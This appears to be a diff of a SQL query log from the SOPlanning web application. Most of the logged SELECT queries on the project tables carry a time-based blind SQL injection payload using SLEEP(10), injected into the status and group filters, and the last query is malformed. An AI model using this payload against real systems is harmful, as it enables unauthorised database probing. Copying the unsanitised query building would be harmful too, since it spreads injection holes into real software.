@@ -1,4 +1,37 @@
 
-show tables from `soplanning15002` like 'planning_config'
-show tables from `soplanning15002` like 'planning_config'
-show tables from `soplanning15002` like 'planning_config'
+SELECT distinct planning_projet.*, planning_groupe.nom AS nom_groupe, planning_user.nom AS nom_createur, ps.nom as statut_nom, ps.pourcentage as statut_pourcentage, ps.couleur as statut_couleur, COUNT(pp.periode_id) AS totalPeriodes
+			FROM planning_projet
+			INNER JOIN planning_status ps ON ps.status_id = planning_projet.statut 
+			LEFT JOIN planning_groupe ON planning_groupe.groupe_id = planning_projet.groupe_id
+			LEFT JOIN planning_periode pp ON planning_projet.projet_id = pp.projet_id
+			LEFT JOIN planning_user ON planning_user.user_id = planning_projet.createur_id  WHERE planning_projet.statut in ('todo','todo'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+'Liquidsky'='Liquidsky','absàvalide') GROUP BY planning_projet.projet_id  ORDER BY nom_groupe ASC,nom asc
+SELECT distinct planning_projet.*, planning_groupe.nom AS nom_groupe, planning_user.nom AS nom_createur, ps.nom as statut_nom, ps.pourcentage as statut_pourcentage, ps.couleur as statut_couleur, COUNT(pp.periode_id) AS totalPeriodes
+			FROM planning_projet
+			INNER JOIN planning_status ps ON ps.status_id = planning_projet.statut 
+			LEFT JOIN planning_groupe ON planning_groupe.groupe_id = planning_projet.groupe_id
+			LEFT JOIN planning_periode pp ON planning_projet.projet_id = pp.projet_id
+			LEFT JOIN planning_user ON planning_user.user_id = planning_projet.createur_id  WHERE planning_projet.statut in ('todo','absàvalide')		AND (planning_projet.groupe_id IN ('todo'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+'Liquidsky'='Liquidsky') ) GROUP BY planning_projet.projet_id  ORDER BY nom_groupe ASC,nom asc
+SELECT distinct planning_projet.*, planning_groupe.nom AS nom_groupe, planning_user.nom AS nom_createur, ps.nom as statut_nom, ps.pourcentage as statut_pourcentage, ps.couleur as statut_couleur, COUNT(pp.periode_id) AS totalPeriodes
+			FROM planning_projet
+			INNER JOIN planning_status ps ON ps.status_id = planning_projet.statut 
+			LEFT JOIN planning_groupe ON planning_groupe.groupe_id = planning_projet.groupe_id
+			LEFT JOIN planning_periode pp ON planning_projet.projet_id = pp.projet_id
+			LEFT JOIN planning_user ON planning_user.user_id = planning_projet.createur_id  WHERE planning_projet.statut in ('todo','absàvalide')		AND (planning_projet.groupe_id IN ('todo'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+'Liquidsky'='Liquidsky') ) GROUP BY planning_projet.projet_id  ORDER BY nom_groupe ASC,nom asc
+SELECT distinct planning_projet.*, planning_groupe.nom AS nom_groupe, planning_user.nom AS nom_createur, ps.nom as statut_nom, ps.pourcentage as statut_pourcentage, ps.couleur as statut_couleur, COUNT(pp.periode_id) AS totalPeriodes
+			FROM planning_projet
+			INNER JOIN planning_status ps ON ps.status_id = planning_projet.statut 
+			LEFT JOIN planning_groupe ON planning_groupe.groupe_id = planning_projet.groupe_id
+			LEFT JOIN planning_periode pp ON planning_projet.projet_id = pp.projet_id
+			LEFT JOIN planning_user ON planning_user.user_id = planning_projet.createur_id  WHERE planning_projet.statut in ('todo','absàvalide')		AND (planning_projet.groupe_id IN ('todo'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+'Liquidsky'='Liquidsky') ) GROUP BY planning_projet.projet_id  ORDER BY nom_groupe ASC,nom asc
+SELECT distinct planning_projet.*, planning_groupe.nom AS nom_groupe, planning_user.nom AS nom_createur, ps.nom as statut_nom, ps.pourcentage as statut_pourcentage, ps.couleur as statut_couleur, COUNT(pp.periode_id) AS totalPeriodes
+			FROM planning_projet
+			INNER JOIN planning_status ps ON ps.status_id = planning_projet.statut 
+			LEFT JOIN planning_groupe ON planning_groupe.groupe_id = planning_projet.groupe_id
+			LEFT JOIN planning_periode pp ON planning_projet.projet_id = pp.projet_id
+			LEFT JOIN planning_user ON planning_user.user_id = planning_projet.createur_id  WHERE planning_projet.statut in ('todo','absàvalide')		AND (planning_projet.groupe_id IN ('todo'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+'Liquidsky'='Liquidsky') ) GROUP BY planning_projet.projet_id  ORDER BY nom_groupe ASC,nom asc
+SELECT distinct planning_projet.*, planning_groupe.nom AS nom_groupe, planning_user.nom AS nom_createur, ps.nom as statut_nom, ps.pourcentage as statut_pourcentage, ps.couleur as statut_couleur, COUNT(pp.periode_id) AS totalPeriodes
+			FROM planning_projet
+			INNER JOIN planning_status ps ON ps.status_id = planning_projet.statut 
+			LEFT JOIN planning_groupe ON planning_groupe.groupe_id = planning_projet.groupe_id
+			LEFT JOIN planning_periode pp ON planning_projet.projet_id = pp.projet_id
+			LEFT JOIN planning_user ON planning_user.user_id = planning_projet.createur_id  WHERE planning_projet.statut in ('todo','absàvalide')AND (planning_projet.groupe_id IN ('')		AND (planning_projet.groupe_id IN ('') ) GROUP BY planning_projet.projet_id  ORDER BY nom_groupe ASC,nom asc
